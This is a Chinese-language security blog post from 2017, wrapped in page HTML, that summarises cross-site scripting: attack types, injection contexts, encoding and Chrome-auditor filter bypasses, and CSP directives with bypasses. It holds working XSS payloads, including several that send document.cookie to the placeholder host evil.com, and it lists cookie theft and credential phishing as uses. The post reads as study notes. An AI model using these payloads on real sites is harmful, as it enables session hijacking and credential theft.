@@ -1,0 +1,410 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<title>
+  
+    XSS小结
+  
+</title>
+
+<meta name="description" content="XSS小结​    最近解除了一些xss方面的知识，虽然感觉自己了解的只是冰山一脚。但积累下来还是很有必要的。">
+<meta name="keywords" content="WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS小结">
+<meta property="og:url" content="http://spikesec.cn/2017/08/09/XSS小结/index.html">
+<meta property="og:site_name" content="Spike Security">
+<meta property="og:description" content="XSS小结​    最近解除了一些xss方面的知识，虽然感觉自己了解的只是冰山一脚。但积累下来还是很有必要的。">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-03-14T07:01:30.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS小结">
+<meta name="twitter:description" content="XSS小结​    最近解除了一些xss方面的知识，虽然感觉自己了解的只是冰山一脚。但积累下来还是很有必要的。">
+
+
+  <link rel="alternative" href="/atom.xml" title="Spike Security" type="application/atom+xml">
+
+
+
+  <link rel="icon" href="/favicon.png">
+
+
+<link rel="stylesheet" href="/perfect-scrollbar/css/perfect-scrollbar.min.css">
+<link rel="stylesheet" href="/styles/main.css">
+
+
+
+
+
+
+</head>
+<body
+  
+    class="monochrome"
+  
+  >
+  <div class="mobile-header">
+  <button class="sidebar-toggle" type="button">
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+    <span class="icon-bar"></span>
+  </button>
+  <a class="title" href="/">Spike Security</a>
+</div>
+
+  <div class="main-container">
+    <div class="sidebar">
+  <div class="header">
+    <h1 class="title"><a href="/">Spike Security</a></h1>
+    
+    <div class="info">
+      <div class="content">
+        
+        
+          <div class="author">Spike</div>
+        
+      </div>
+      
+        <div class="avatar">
+          
+            <a href="/about"><img src="/images/cc/avatar.jpeg"></a>
+          
+        </div>
+      
+    </div>
+  </div>
+  <div class="body">
+    
+      
+        <ul class="nav">
+          
+            
+              <li class="category-list-container">
+                <a href="javascript:;">Category</a>
+                
+              </li>
+            
+          
+            
+              <li class="tag-list-container">
+                <a href="javascript:;">Tag</a>
+                <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Security/">Security</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/WEB/">WEB</a><span class="tag-list-count">11</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/other/">other</a><span class="tag-list-count">2</span></li></ul>
+              </li>
+            
+          
+            
+              <li class="archive-list-container">
+                <a href="javascript:;">Archive</a>
+                <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/">2018</a><span class="archive-list-count">8</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/">2017</a><span class="archive-list-count">10</span></li></ul>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="/" title="Homepage">Homepage</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/archives" title="By Year">By Year</a>
+              </li>
+            
+          
+        </ul>
+      
+        <ul class="nav">
+          
+            
+              <li>
+                <a href="http://weibo.com/spikex" title="Weibo" target="_blank" rel="noopener">Weibo</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="https://github.com/SpikeI" title="Github" target="_blank" rel="noopener">Github</a>
+              </li>
+            
+          
+            
+              <li>
+                <a href="/atom.xml" title="RSS">RSS</a>
+              </li>
+            
+          
+        </ul>
+      
+    
+  </div>
+</div>
+
+    <div class="main-content">
+      
+        <div style="max-width: 1000px">
+      
+          <article id="post-XSS小结" class="article article-type-post">
+  
+    <h1 class="article-header">
+      XSS小结
+    </h1>
+  
+  
+
+  <div class="article-info">
+    <span class="article-date">
+  2017-08-09
+</span>
+
+    
+
+    
+	<span class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/WEB/">WEB</a></li></ul>
+	</span>
+
+
+  </div>
+  <div class="article-entry">
+    <h2 id="XSS小结"><a href="#XSS小结" class="headerlink" title="XSS小结"></a>XSS小结</h2><p>​    最近解除了一些xss方面的知识，虽然感觉自己了解的只是冰山一脚。但积累下来还是很有必要的。</p>
+<a id="more"></a>
+<h4 id="一、原理"><a href="#一、原理" class="headerlink" title="一、原理"></a>一、原理</h4><p>​    HTML代码注入，攻击用户的浏览器。注入的代码根据浏览器的功能不同而不同，因为浏览器在进行页面渲染时会解析并执行js，并且得到JS的执行权限后能够实现很多很丰富的功能（如得到COOKIE），所以xsser很多时候是以执行JS为目的。</p>
+<p>​    常见的<strong>XSS实现方式</strong>是通过插入html标签，注入代码以执行JAVASCRIPT脚本。如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	window.location=http://www.evil.com</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>​    <strong>XSS的类型</strong>主要分为三类，反射型，存储型和DOM XSS。</p>
+<p>​    其中，反射型是构造，一条恶意URL。诱使被攻击者点击该URL，使这个URL在特定的浏览器中打开。从而达到执行JAVASCRIPT的目的。</p>
+<p>​    存储型XSS，以提交信息的方式将恶意代码插入到页面中（如评论），这样使每一个访问该页面的用户都会收到该恶意代码的攻击。</p>
+<p>​    DOM XSS ，这种类型的XSS和反射型的表现形式一样，都是通过让被攻击者点击恶意url来达到插入恶意代码的目的。但与其不同的是反射型需要与服务器交互，DOM XSS本地即可实现攻击。</p>
+<p>​    <strong>插入位置</strong></p>
+<p>​    在进行XSS攻击时要先确定可控字段的插入位置。</p>
+<p>​    标签外：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;p&gt;</span><br><span class="line">	[content:xxx]</span><br><span class="line">&lt;/p&gt;</span><br></pre></td></tr></table></figure>
+<p>​    此时需要插入例如<code>\&lt;script\&gt;xxx\&lt;/script\&gt;</code>的内容</p>
+<p>​    标签内：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form&gt;</span><br><span class="line">	&lt;input value=&quot;[content:xxx]&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure>
+<p>​    此时就需要插入例如<code>&quot; onmouseover=&quot;xxx&quot; a=&quot;</code>的内容</p>
+<p>​    <strong>常用方法：</strong></p>
+<p>​    列举一些常见方法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=[url]&gt;&lt;/script&gt;</span><br><span class="line">&lt;img src=1 onerror=[js code]&gt;</span><br><span class="line">&lt;iframe srcdoc=&quot;&lt;svg onload=alert(1)&amp;nvgt;&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>​    <strong>CSS XSS</strong></p>
+<p>​    通过CSS强大的包容性，在网页中插入符合CSS rulesets的内容使得可以让浏览器将其内容解析成CSS语法，从而</p>
+<p>参照：<a href="https://html5sec.org/" target="_blank" rel="noopener">https://html5sec.org/</a></p>
+<p>里面有更全面的利用姿势。</p>
+<h4 id="二、By-pass"><a href="#二、By-pass" class="headerlink" title="二、By pass"></a>二、By pass</h4><p>​    XSS ByPass姿势千奇百怪，各路大神的方法太多，我在这里只是讲一些自己积累的一点存货。</p>
+<p>​    在插入页面前，用户的输入通常会经过filter过滤，最常见的bypass技巧通常是各种编码，有html实体编码，JAVASCRIPT编码等等。</p>
+<p>​    其中html实体编码的原理是，通过对非标签字段的Html编码，来绕过一些简单的过滤如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&apos;http://evil.com?&apos;+escape(document.cookie)&gt;</span><br><span class="line">	=&gt;</span><br><span class="line">&lt;script src=&apos;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#101;&amp;#118;&amp;#105;&amp;#108;&amp;#46;&amp;#99;&amp;#111;&amp;#109;&amp;#63;&apos;+escape(document.cookie)&gt;</span><br></pre></td></tr></table></figure>
+<p>​    除此外还包括unicode编码,String.fromCharCode等：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006C\u0065\u0072\u0074(1)&lt;/script&gt;</span><br><span class="line">&lt;img src=1 onerror=&apos;eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41, 59))&apos;&gt;</span><br></pre></td></tr></table></figure>
+<p>​    下面是在打过几次CTF后攒下了一些<strong>小技巧_</strong>：</p>
+<p>​    很多浏览器都会提供自动识别打错的中文字符，当过滤 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">​	标签内空格被过滤或实体化可以使用```/```代替如```&lt;img/src=&apos;#&apos;onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure></p>
+<p>​    </p>
+<h5 id="chrome-XSS-author-bypass"><a href="#chrome-XSS-author-bypass" class="headerlink" title="chrome XSS_author bypass"></a>chrome XSS_author bypass</h5><ol>
+<li>：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&apos;X-XSS-Protection: 1; mode=block&apos;);</span><br><span class="line">echo &quot;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;&#123;$_GET[&apos;html&apos;]&#125; &lt;/body&gt;&lt;/html&gt;&quot;;</span><br></pre></td></tr></table></figure>
+<p>访问<code>http://localhost/?html=%3Cscript%3Ealert(1);%3C/script</code>便会弹框。</p>
+<p>导致这个漏洞是因为chrome会自动闭合未闭合的标签，auditor发现其标签还未闭合，所以没有拦截。</p>
+<p>以及：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xss=&quot;&gt;&lt;script/src=//html5sec.org/test.js&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;1&lt;(br=1)*/%0dalert(1)&lt;/script&gt;</span><br><span class="line">=&gt;</span><br><span class="line">&lt;script&gt;1&lt;(br=1)*/&lt;br/&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;(quot=1)&quot;alert``&lt;/script&gt;</span><br><span class="line">=&gt;</span><br><span class="line">&lt;script&gt;(quot=1)&amp;quot;alert``&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)%0d%0a--&gt;%09&lt;/script&gt;</span><br><span class="line">=&gt;</span><br><span class="line">&lt;script&gt;alert(1)</span><br><span class="line">--&gt;\u0009&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">or \r or &amp;quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%00%00%00%00%00%00%00&lt;script%20src=http://xss.rocks/xss.js  &gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>以上来自    twitter。</p>
+<h5 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h5><p>​    编码常用HTML实体编码，unicode编码</p>
+<p>​    html实体编码编码的内容用在标签内的属性值上，因为html parser要优先于 JavaScript parser，不能将标签名和属性名进行html编码，否则浏览器将认为这个标签为html的文本。如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&apos;&amp;#x68;ttps://www.zhihu.com/&apos;&gt;aaa&lt;/a&gt;</span><br><span class="line">&amp;#x68; =&gt; &apos;h&apos;</span><br></pre></td></tr></table></figure>
+<p>​    unicode编码通常用在，js代码中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">	\u006cocation.href=&apos;http://www.baidu.com&apos;;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">\u006c =&gt; &apos;l&apos;</span><br></pre></td></tr></table></figure>
+<h4 id="三、CSP"><a href="#三、CSP" class="headerlink" title="三、CSP"></a>三、CSP</h4><p>​    CSP是一个网站内引用外部资源的白名单机制，他是浏览器实现的一个功能，以确保正确的资源引用。同时也防止了XSS的情况。</p>
+<p>​    CSP机制是在HTTP头里面定义的，如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; img-src &apos;self&apos; data:; media-src mediastream:</span><br></pre></td></tr></table></figure>
+<p>​    其中<code>Content-Security-Policy</code>是这个机制的http头域名，域值是由<code>;</code>分隔的多个CSP策略。在后面的CSP策略中：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">default-src &apos;self&apos;</span><br><span class="line">default-src http://*.foo.com</span><br></pre></td></tr></table></figure>
+<h5 id="策略指令"><a href="#策略指令" class="headerlink" title="策略指令"></a>策略指令</h5><p>default-src表示了支持的策略指令，策略指令包括：</p>
+<ul>
+<li>base_uri source-list                /指定了URI作为文档的基准URL</li>
+<li>child-src source-list                /定义了文档中的嵌套浏览的上下文的源（\&lt;frame>\&lt;iframe>）比frame-src更好</li>
+<li>connect-src source-list          /定义了请求、XMLRequest、WebSocket和EventSource的源</li>
+<li>default-src source-list            /定义了默认的安全策略，其中包括:<ul>
+<li><code>child-src</code></li>
+<li><code>connect-src</code></li>
+<li><code>font-src</code></li>
+<li><code>img-src</code></li>
+<li><code>media-src</code></li>
+<li><code>object-src</code></li>
+<li><code>script-src</code></li>
+<li><code>style-src</code></li>
+</ul>
+</li>
+<li>font-src source-list                         /定义了字体的源</li>
+<li>form-action source-list                  /定义了\&lt;form>提交的源</li>
+<li>frame-ancestors source-list          /</li>
+<li>frame-src source-list                      /定义了\&lt;frame>\&lt;iframe>标签的源</li>
+<li>img-src source-list                          /定义了图片的源</li>
+<li>…</li>
+</ul>
+<p>参见<a href="https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/Security/CSP/CSP_policy_directives</a></p>
+<h5 id="源列表和关键字"><a href="#源列表和关键字" class="headerlink" title="源列表和关键字"></a>源列表和关键字</h5><p>在策略指令后可以接源列表和关键字，源列表如<code>http://*.foo.com:443</code>,代表了一个系列的url列表</p>
+<p>如下字段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script-src http://*.foo.com</span><br></pre></td></tr></table></figure>
+<p>代表了script的源只能通过http协议从foo.com的域下获取。</p>
+<p>在定义源的范围时，也可以定义关键字，有如下四种：</p>
+<ul>
+<li>‘none’                            /代表空集；即不匹配任何 URL。</li>
+<li>‘self’                               /代表和文档同源，包括相同的 URL 协议和端口号。</li>
+<li>‘unsafe-inline’               /允许使用内联资源，如内联的\&lt;script>元素、javascript: URL、内联的事件处理函数和内联的\&lt;style>元素。</li>
+<li>‘unsafe-eval’                  /允许使用 <code>eval()</code> 等通过字符串创建代码的方法。</li>
+</ul>
+<p>经常使用的关键字是’unsafe-inline’，如果在CSP中加入’unsafe-inline’则可以在代码中执行内联脚本。</p>
+<p>如：</p>
+<p><strong>script-src</strong>: unsafe-inline</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  var xhr = new XMLHttpRequest();</span><br><span class="line">  xhr.open(&apos;GET&apos;, &apos;https://www.baidu.com&apos;);</span><br><span class="line">  xhr.send();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h5 id="By-Pass-CSP"><a href="#By-Pass-CSP" class="headerlink" title="By Pass CSP"></a>By Pass CSP</h5><ul>
+<li>在CSP中如果有script标签有unsafe-inline，就可以执行内联脚本，我们可以通过<code>window.location</code>来传递<code>cookie</code>:</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">	window.location = &apos;http://evil.com/?cookie&apos; + escape(document.cookie);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在html的link标签中有一个预加载的功能，可以用这个功能bypassCSP</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&apos;prefetch&apos; href=&apos;http://evil.com/evil.js&apos;&gt;</span><br></pre></td></tr></table></figure>
+<h4 id="XSS的利用"><a href="#XSS的利用" class="headerlink" title="XSS的利用"></a>XSS的利用</h4><p>XSS的本质是在浏览器执行Javascript代码。讲道理在这里可以应用的攻击手段就很多了。</p>
+<p><strong>盗cookie</strong></p>
+<p>最最常见的就是盗取cookie了，这里不详细说明了。盗取cookie简单来讲就是获取登陆状态，拿到一个身份令牌，通常这个时间是有限的。网上也有很多状态维持的方法。但cookie一旦被设置成httponly那么将无法直接从JS中获取cookie。</p>
+<p>但XSS的利用并没有到此为止，利用的可能性多种多样。只能够被想象力所限制。</p>
+<p><strong>浏览器漏洞</strong></p>
+<p>这个也很好理解，如果浏览器本身存在一个弹计算器的漏洞。如果应用场景符合，可能通过执行js将它拿下。</p>
+<p><strong>CSRF</strong></p>
+<p>可以将CSRF放到XSS的payload里面，形成XSRF，如果有xss的话，可以读取页面上到的csrftoken，csrf效果更好。如果有验证码的话，在《白帽子讲web安全》中提到了一种方法，即将验证码发回攻击者服务器，在根据验证码修改payload。（但这样不就有个问题，攻击者需要第二次加载页面才能重新获取修改后的payload，但第二次加载页面不就生成新的验证码了吗？）</p>
+<p><strong>XSS钓鱼</strong></p>
+<p>用XSS的payload做一个登陆框啥的，把账号密码发到攻击者服务器。</p>
+<p><strong>获取用户信息</strong></p>
+<p>我们能够获取的信息就相当于我们拿到用户浏览器命令行所能够获取的信息。可以通过JS来识别用户浏览器以及插件安装情况（通过判断classid是否存在来判断是否安装了插件）。通过CSS的一些特点来判断历史记录（访问过的网站，链接颜色会有所不同）。获取真实IP地址，道哥书中讲的是用Java来获取IP，网上也有用WebRTC来获取IP的。</p>
+<p><strong>内网扫描</strong></p>
+<p>总之XSS等前端安全的安全威胁将一直存在，所以前端安全将有无比广阔的前景。</p>
+
+  </div>
+  <footer class="article-footer">
+    
+  <div class="cc">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.en" target="_blank" title="Attribution-ShareAlike">
+      <img src="/images/cc/cc.png">
+      
+          <img src="/images/cc/by.png">
+        
+          <img src="/images/cc/sa.png">
+      
+      <span>
+        This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
+      </span>
+    </a>
+  </div>
+
+
+    
+
+  </footer>
+</article>
+
+
+
+
+
+
+
+          <div class="main-footer">
+  
+    © 2018 Spike Security - Powered by <a href="http://hexo.io" target="_blank">Hexo</a> - Theme <a href="https://github.com/denjones/hexo-theme-chan" target="_blank">Chan</a>
+  
+</div>
+
+      
+        </div>
+      
+    </div>
+  </div>
+  <script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+
+  <link rel="stylesheet" href="/PhotoSwipe/photoswipe.css">
+  <link rel="stylesheet" href="/PhotoSwipe/default-skin/default-skin.css">
+
+  <!-- Root element of PhotoSwipe. Must have class pswp. -->
+  <div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe.
+             It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+      <!-- Container that holds slides.
+                PhotoSwipe keeps only 3 of them in the DOM to save memory.
+                Don't modify these 3 pswp__item elements, data is added later on. -->
+      <div class="pswp__container">
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+        <div class="pswp__item"></div>
+      </div>
+
+      <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+      <div class="pswp__ui pswp__ui--hidden">
+
+        <div class="pswp__top-bar">
+
+          <!--  Controls are self-explanatory. Order can be changed. -->
+
+          <div class="pswp__counter"></div>
+
+          <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+          <button class="pswp__button pswp__button--share" title="Share"></button>
+
+          <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+          <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+          <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+          <!-- element will get class pswp__preloader--active when preloader is running -->
+          <div class="pswp__preloader">
+            <div class="pswp__preloader__icn">
+              <div class="pswp__preloader__cut">
+                <div class="pswp__preloader__donut"></div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+          <div class="pswp__share-tooltip"></div>
+        </div>
+
+        <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button>
+
+        <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button>
+
+        <div class="pswp__caption">
+          <div class="pswp__caption__center"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <script src="/PhotoSwipe/photoswipe.js"></script>
+  <script src="/PhotoSwipe/photoswipe-ui-default.js"></script>
+
+
+<script src="/perfect-scrollbar/js/min/perfect-scrollbar.min.js"></script>
+<script src="/scripts/main.js"></script>
+
+</body>
+</html>
